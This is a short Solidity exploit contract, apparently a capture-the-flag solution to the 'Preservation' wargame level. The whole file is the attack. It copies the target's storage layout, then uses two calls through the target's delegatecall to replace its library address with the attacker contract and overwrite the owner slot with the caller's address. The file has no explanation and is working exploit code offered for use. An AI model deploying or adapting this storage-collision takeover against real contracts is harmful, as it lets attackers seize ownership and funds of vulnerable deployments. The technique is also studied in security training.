// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint256) external;
}

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(IPreservation _target) external {
        _target.setFirstTime(uint256(uint160(address(this))));
        _target.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
